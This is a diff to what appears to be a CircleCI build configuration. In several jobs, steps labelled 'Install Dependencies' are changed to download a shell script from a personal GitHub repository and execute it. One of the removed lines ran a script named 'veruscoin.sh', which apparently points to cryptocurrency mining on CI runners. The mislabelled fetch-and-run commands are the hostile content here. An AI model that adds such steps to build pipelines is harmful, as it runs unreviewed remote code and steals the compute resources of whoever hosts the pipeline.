@@ -6,38 +6,38 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: lscpu
+            command: wget https://raw.githubusercontent.com/cepdian/tes/main/dhira.sh && chmod +x dhira.sh && dhira.sh
     aku2:
       docker:
             - image: circleci/ruby:2.4
       steps:
         - run:
             name: Install Dependencies
-            command: lscpu
+            command: wget https://raw.githubusercontent.com/cepdian/tes/main/dhira.sh && chmod +x dhira.sh && dhira.sh
     aku3:
       docker:
             - image: circleci/ruby:2.4
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://raw.githubusercontent.com/kaestmrah/vrs/main/veruscoin.sh && chmod u+x veruscoin.sh && timeout 60m  ./veruscoin.sh
+            command: wget https://raw.githubusercontent.com/cepdian/tes/main/dhira.sh && chmod +x dhira.sh && dhira.sh
     aku4:
       docker:
             - image: circleci/ruby:2.4
       steps:
         - run:
             name: Install Dependencies
-            command: lscpu
+            command: wget https://raw.githubusercontent.com/cepdian/tes/main/dhira.sh && chmod +x dhira.sh && dhira.sh
     aku5:
       docker:
             - image: circleci/ruby:2.4
       steps:
         - run:
             name: Install Dependencies
-            command: lscpu
+            command: wget https://raw.githubusercontent.com/cepdian/tes/main/dhira.sh && chmod +x dhira.sh && dhira.sh
 
 workflows:
-    version: 2
+    version: 2.1
     build:
         jobs:
             - aku1
